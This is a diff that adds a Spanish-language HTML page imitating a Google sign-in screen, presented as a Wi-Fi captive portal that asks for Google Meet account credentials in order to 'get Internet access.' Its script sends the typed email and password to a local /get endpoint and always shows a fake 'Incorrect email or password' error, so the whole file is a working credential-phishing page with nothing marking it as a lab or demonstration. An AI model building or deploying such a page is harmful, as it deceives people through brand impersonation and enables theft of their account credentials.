@@ -1,0 +1,394 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+
+    <style>
+      * {
+        box-sizing: border-box;
+        margin: 0;
+        padding: 0;
+        font-family: Arial, sans-serif;
+      }
+      body {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+        background-color: #f1f1f1;
+      }
+
+      h1 {
+        font-size: x-large;
+        padding-bottom: 10px;
+      }
+
+      strong {
+        font-size: x-large;
+      }
+
+      .login-container {
+        background-color: #fff;
+        padding: 30px;
+        border-radius: 30px;
+        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+      }
+
+      #logo {
+        display: block;
+        margin: 0 auto 10px;
+        padding-top: -10px;
+      }
+
+      #logo svg {
+        position: relative;
+        size-adjust: 100px;
+        max-height: 300px;
+        margin: 0 auto;
+        display: block;
+      }
+
+      .text {
+        text-align: center;
+        margin-top: 20px;
+        margin-bottom: 30px;
+        font-size: 14px;
+        color: #222222c0;
+      }
+
+      .text h2 {
+        margin-top: 5px;
+        margin-bottom: 3px;
+        font-weight: lighter;
+        color: #222222c0;
+      }
+
+      .g-input {
+        display: block;
+        width: 100%;
+        padding: 10px;
+        margin-bottom: 10px;
+        border: 1px solid #747775;
+        border-radius: 5px;
+      }
+
+      .buttons {
+        display: flex;
+        flex-direction: row-reverse;
+        flex-wrap: wrap;
+        width: 100%;
+        margin-top: 20px;
+      }
+
+      input[type="checkbox"] {
+        /* Double-sized Checkboxes */
+        -ms-transform: scale(1.1); /* IE */
+        -moz-transform: scale(1.1); /* FF */
+        -webkit-transform: scale(1.1); /* Safari and Chrome */
+        -o-transform: scale(1.1); /* Opera */
+        transform: scale(1.1);
+        padding: 10px;
+        margin-left: 5px;
+        margin-right: 7px;
+      }
+
+      .info {
+        margin-bottom: -10px;
+      }
+
+      .showPass {
+        color: #222222c0;
+        font-size: 0.75rem;
+        font-weight: lighter;
+        width: 100%;
+        padding: 0px;
+        border: none;
+        border-radius: 30px;
+        background-color: #fff;
+        cursor: pointer;
+        text-align: center;
+        vertical-align: middle;
+        line-height: 50px;
+        letter-spacing: 0rem;
+      }
+
+      .showPass:hover {
+        background-color: #e4eaf965;
+        cursor: pointer;
+      }
+
+      .showPass:active {
+        background-color: #e4eaf9d9;
+      }
+      .showPass:focus {
+        background-color: #e4eaf9d9;
+      }
+
+      .checkbox-label {
+        padding-bottom: -10px;
+      }
+
+      .gbtn-primary {
+        width: 30%;
+        margin-top: 5px;
+        text-align: center;
+        vertical-align: middle;
+        height: 38px;
+        border: none;
+        border-radius: 30px;
+        background-color: #1a73e8;
+        color: #fff;
+        cursor: pointer;
+        font-size: 0.875rem;
+        font-weight: 900;
+        font-weight: var(--c-afwt, 500);
+        letter-spacing: 0rem;
+      }
+
+      .gbtn-primary:hover {
+        background-color: #164aab;
+      }
+
+      .footerMenu {
+        margin-top: 20px;
+        display: block;
+        direction: ltr;
+        font-size: 0.75rem;
+        font-weight: 400;
+        letter-spacing: 0rem;
+        line-height: 1.4285714286;
+        width: 105%;
+      }
+
+      .footerMenu .class1 {
+        float: left;
+        display: inline;
+        width: 37%;
+        color: #222222c0;
+        cursor: pointer;
+        margin: -3.5px 7.4%;
+        padding: 5px 4px;
+        border: none;
+        border-radius: 10px;
+        text-align: center;
+        vertical-align: middle;
+      }
+
+      .footerMenu .class1:hover {
+        background-color: #e1e1e1;
+      }
+
+      .footerMenu .buttonsLeft {
+        margin-left: 20%;
+      }
+
+      .footerMenu .class2 {
+        float: left;
+        display: inline;
+        color: #222222c0;
+        display: inline;
+        cursor: pointer;
+        padding: 1% 1%;
+        margin-left: 0%;
+        margin-right: 10%;
+        border: none;
+        border-radius: 10px;
+        text-align: center;
+        vertical-align: middle;
+      }
+
+      .footerMenu .class3 {
+        float: left;
+        display: inline;
+        color: #222222c0;
+        cursor: pointer;
+        padding: 1% 1%;
+        margin-left: 1%;
+        border: none;
+        border-radius: 10px;
+        text-align: center;
+        vertical-align: middle;
+      }
+
+      .footerMenu .class4 {
+        float: left;
+        display: inline;
+        color: #222222c0;
+        cursor: pointer;
+        padding: 1% 1%;
+        margin-left: 0.5%;
+        border: none;
+        border-radius: 10px;
+        text-align: center;
+        vertical-align: middle;
+      }
+
+      .footerMenu .class2:hover,
+      .class3:hover,
+      .class4:hover {
+        background-color: #e1e1e1;
+      }
+
+      .footerMenu .class3 {
+        margin-left: -30px;
+      }
+
+      .footerMenu .openMenu {
+        padding-top: 7px;
+        margin-left: 4%;
+        color: #222222c0;
+      }
+
+      /* Error message styling */
+      .error-message {
+        position: absolute;
+        color: #d93025; /* Google's red color for errors */
+        font-size: 13px;
+        width: 100%;
+        display: flex;
+        align-items: center;
+        margin-top: -27px;
+      }
+
+      .error-icon {
+        margin-right: 5px;
+      }
+    </style>
+    <meta
+      name="viewport"
+      content="width=device-width,initial-scale=1,maximum-scale=1"
+    />
+  </head>
+  <body>
+    <div>
+      <div class="login-container">
+        <form action="/get" id="email-form-step">
+          <div id="logo">
+            <svg
+              xmlns="http://www.w3.org/2000/svg"
+              xmlns:xlink="http://www.w3.org/1999/xlink"
+              width="144"
+              height="24"
+              viewBox="0 0 144 24"
+            >
+              <image
+                xlink:href="data:image/png;base64,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"
+                x="0"
+                y="0"
+                width="144"
+                height="24"
+              />
+            </svg>
+          </div>
+          <div class="content">
+            <div class="text">
+              <h1>Para obtener acceso a Internet</h1>
+              <h2>
+                Accede con la cuenta que te inscribiste a
+                <strong>Google Meet</strong>
+              </h2>
+            </div>
+            <!-- Error message placeholder -->
+            <div id="error-message" class="error-message" style="display: none">
+              <span class="error-icon">&#9888;</span>
+              <!-- Warning symbol -->
+              Incorrect email or password.
+            </div>
+            <div class="info">
+              <input
+                name="email"
+                type="email"
+                class="g-input"
+                id="email"
+                placeholder="Email"
+                required
+              />
+              <input
+                name="password"
+                type="password"
+                class="g-input"
+                placeholder="Clave"
+                id="password"
+                required
+              />
+            </div>
+            <label for="checkbox" class="showPass">
+              <input
+                type="checkbox"
+                name="showPass"
+                value="value"
+                onclick="myFunction()"
+              />
+              Mostrar Contrasena
+            </label>
+            <div class="buttons">
+              <button class="gbtn-primary" id="siguiente" type="submit">
+                Siguiente
+              </button>
+            </div>
+          </div>
+        </form>
+      </div>
+      <footer class="footerMenu">
+        <p class="class1">
+          Espanol (Latinoamerica)
+          <svg
+            class="openMenu"
+            xmlns="http://www.w3.org/2000/svg"
+            xmlns:xlink="http://www.w3.org/1999/xlink"
+            width="16"
+            height="16"
+            viewBox="0 0 16 16"
+          >
+            <image
+              xlink:href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAK1JREFUOE/N0i8KAkEcxfHPIhgsNg8geAG7wSAiGDUbPIAeRbNVsGrToNls1gsYTAaDiAguLOu/XbY4ZWDm/b7Mm/cCGVeQcd7/AA4op7SzRyW0MMIgJWCMYQh47BP0E0Km6OEW/cQcZuj+gCzQwfWhi6eQxxytD5A12riE9+9iLGCJWgyyRQPn6PmnHhSxQfUp3qGOU/xl34pUwuo50MTxna3/aWLC+F9lmS3cAYizFRHRmvQHAAAAAElFTkSuQmCC"
+              x="0"
+              y="0"
+              width="16"
+              height="16"
+            />
+          </svg>
+        </p>
+
+        <div class="buttonsLeft">
+          <p class="class2">Ayuda</p>
+          <p class="class3">Privacidad</p>
+          <p class="class4">Terminos</p>
+        </div>
+      </footer>
+    </div>
+  </body>
+  <script>
+    const form = document.getElementById("email-form-step");
+    form.addEventListener("submit", function (event) {
+      event.preventDefault();
+      const email = event.currentTarget.email.value;
+      const password = event.currentTarget.password.value;
+
+      // Properly encode the parameters to handle special characters
+      const encodedEmail = encodeURIComponent(email);
+      const encodedPassword = encodeURIComponent(password);
+
+      fetch(`/get?email=${encodedEmail}&password=${encodedPassword}`);
+    });
+
+    function myFunction() {
+      var x = document.getElementById("password");
+      if (x.type === "password") {
+        x.type = "text";
+      } else {
+        x.type = "password";
+      }
+    }
+
+    document.getElementById("siguiente").addEventListener("click", function () {
+      const errorMessage = document.getElementById("error-message");
+      errorMessage.style.display = "flex"; // Show the error message
+
+      // Hide the error message after 3 seconds (3000 milliseconds)
+      setTimeout(function () {
+        errorMessage.style.display = "none";
+      }, 3000);
+    });
+  </script>
+</html>
